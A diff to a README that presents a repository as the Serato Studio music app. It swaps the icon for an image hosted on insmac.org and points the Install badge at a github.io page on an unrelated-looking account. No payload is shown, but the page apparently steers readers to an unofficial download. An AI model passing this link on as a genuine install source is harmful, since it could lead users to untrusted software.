@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://i1.sndcdn.com/avatars-000606418362-jlke6m-t240x240.jpg" width="100" alt="Serato Studio icon"/>
+  <img src="https://insmac.org/uploads/posts/2023-08/serato-studio.png" width="100" alt="Serato Studio icon"/>
 </p>
 <h1 align="center">Serato Studio — Beat Making And Music Production</h1>
 <p align="center">Professional-grade beat making and music production — powerful features, native performance underneath.</p>
@@ -13,7 +13,7 @@
 
 ---
 
-| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://marat-klubnika-apps.github.io/.github/) | **Native beat making and music production built for professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
+| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://day-deneg-pzh.github.io/.github/seratostudio) | **Native beat making and music production built for professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
 |---|---|
 
 ---
